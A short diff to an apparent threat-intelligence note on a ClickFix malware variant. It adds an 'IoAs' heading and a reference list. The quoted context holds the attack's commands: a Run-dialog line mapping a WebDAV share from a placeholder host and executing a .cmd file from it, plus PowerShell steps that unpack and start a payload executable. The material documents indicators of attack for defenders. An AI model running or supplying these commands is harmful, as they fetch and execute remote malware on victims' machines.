@@ -1,3 +1,4 @@
+# IoAs
 **Stage 1:** Run application executes following command:
 ```
 “cmd.exe” /c net use Z: http://{IP/Domain}/webdav /persistent:no && “Z:\{Filename}.cmd” & net use Z: /delete
@@ -9,4 +10,6 @@ Expand-Archive \”$env:TEMP\{Filename}.zip\” -DestinationPath \”$env:LOCALA
 Start-Process \”$env:LOCALAPPDATA\MyApp\{payload}.exe\””
 ```
 
-[Reference](https://atos.net/en/lp/cybershield/investigating-a-new-click-fix-variant)
+# References
+[1] https://atos.net/en/lp/cybershield/investigating-a-new-click-fix-variant
+
